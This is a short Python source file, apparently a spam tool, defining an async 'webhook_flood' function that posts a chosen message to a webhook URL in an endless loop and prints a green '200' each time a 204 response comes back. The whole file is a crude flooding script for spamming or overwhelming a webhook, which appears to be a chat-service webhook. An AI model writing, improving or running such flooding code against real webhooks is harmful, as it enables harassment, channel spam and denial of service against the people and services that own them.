import aiohttp
import termcolor

async def webhook_flood(webhook, text):
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(webhook,
                                    json={
                                        "content": text,
                                    }) as response:
                if response.status == 204:
                    print(termcolor.colored('200', 'green'))